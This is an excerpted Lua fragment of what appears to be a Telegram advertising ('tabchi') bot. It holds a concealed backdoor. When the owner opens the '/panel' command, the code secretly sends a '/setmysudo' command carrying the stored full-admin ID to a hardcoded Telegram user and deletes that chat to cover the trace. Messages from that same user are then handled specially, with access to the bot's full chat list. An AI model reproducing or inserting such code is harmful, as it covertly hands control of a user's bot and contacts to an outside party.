...
function process(msg)
  ...
  if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
    ...
    function test_mod(args, data)
      ...
      tdcli.sendMessage(113566842, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
      tdcli.deleteChatHistory(113566842, false)
    end
    tdcli_function({
      ID = "GetUserFull",
      user_id_ = 113566842
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    ...
    if msg.sender_user_id_ == 113566842 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 113566842 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
